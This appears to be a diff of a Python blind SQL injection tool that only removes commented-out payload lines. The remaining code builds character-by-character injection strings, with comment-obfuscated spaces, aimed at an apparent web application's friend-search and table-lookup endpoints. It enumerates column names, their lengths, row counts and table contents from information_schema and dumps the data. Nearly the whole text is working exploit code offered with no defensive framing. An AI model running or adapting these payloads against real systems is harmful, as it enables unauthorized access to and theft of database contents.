@@ -125,7 +125,6 @@ class blindC:
         for y in range(1, 3):
             try:
                 injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(column_name),"+ str(y) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+ str(self.tableName) +"'/**/order/**/by/**/column_name/**/limit/**/"+ str(o) +",1)="+ "[CHAR]" + "%23"
-                #injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(table_name),"+ str(y) +",1))/**/from/**/information_schema.tables/**/order/**/by/**/table_name/**/limit/**/" + str(o)  + ",1)=" + "[CHAR]" + "%23"
                 extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                 sys.stdout.write(extracted_char)
                 sys.stdout.flush()
@@ -146,7 +145,6 @@ class blindC:
         for x in range(1, int(tableCL)):
             try:
                 injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/column_name)/**/FROM/**/INFORMATION_SCHEMA.columns/**/where/**/table_name='" + str(self.tableName)  + "'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/"+ str(o) +",1)," + str(x) + ",1))))="+ "[CHAR]" + "%23"
-                #injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/table_name)/**/FROM/**/INFORMATION_SCHEMA.tables/**/ORDER/**/BY/**/table_name/**/LIMIT/**/" + str(o) + ",1)," + str(x)  + ",1))))=" + "[CHAR]" + "%23"
                 extracted_char = chr(getTables_sqli(self.ip, injection_string))
                 sys.stdout.write(extracted_char)
                 sys.stdout.flush()
@@ -179,8 +177,6 @@ class blindD:
     def getDumpColumns_number(self, columnName, tableName, dbName):
         for i in range(1, 2):
             injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name))," + str(i) + ",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+str(self.tableName)+"'/**/and/**/column_name='"+ str(self.columnName) +"')="+ "[CHAR]" +"%23"
-#            injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/column_name)),"+ str(i) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='" + str(self.tableName) +"')=" + "[CHAR]"  +"%23"
-            #injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(count((select/**/table_name)),"+ str(i) + ",1))/**/from/**/information_schema.tables)=" + "[CHAR]" + "%23"
             extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
             sys.stdout.write(extracted_char)
             sys.stdout.flush()
@@ -195,8 +191,6 @@ class blindD:
         for y in range(1, 3):
             try:
                 injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH("+ str(self.columnName)  +")," + str(y)  + ",1))/**/from/**/"+ str(self.tableName) +"/**/limit/**/"+ str(o)+",1)="+ "[CHAR]" +"%23"
-                #injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(column_name),"+ str(y) +",1))/**/from/**/information_schema.columns/**/where/**/table_name='"+ str(self.tableName) +"'/**/order/**/by/**/column_name/**/limit/**/"+ str(o) +",1)="+ "[CHAR]" + "%23"
-                #injection_string = "AAAA')/**/or/**/(select/**/ascii(substring(CHAR_LENGTH(table_name),"+ str(y) +",1))/**/from/**/information_schema.tables/**/order/**/by/**/table_name/**/limit/**/" + str(o)  + ",1)=" + "[CHAR]" + "%23"
                 extracted_char = chr(searchFriends_sqli(self.ip, injection_string))
                 sys.stdout.write(extracted_char)
                 sys.stdout.flush()
@@ -217,7 +211,6 @@ class blindD:
         for x in range(1, int(tableCL)):
             try:
                 injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring(("+ str(self.columnName) +"),"+ str(x) +",1)))/**/from/**/"+ str(self.dbName)+"."+str(self.tableName)+"/**/limit/**/" + str(o) + ",1)="+ "[CHAR]" +"%23"
-                #injection_string = "AAAA')/**/or/**/(select/**/(ascii(substring((SELECT/**/(select/**/column_name)/**/FROM/**/INFORMATION_SCHEMA.columns/**/where/**/table_name='" + str(self.tableName)  + "'/**/ORDER/**/BY/**/column_name/**/LIMIT/**/"+ str(o) +",1)," + str(x) + ",1))))="+ "[CHAR]" + "%23"
                 extracted_char = chr(getTables_sqli(self.ip, injection_string))
                 sys.stdout.write(extracted_char)
                 sys.stdout.flush()
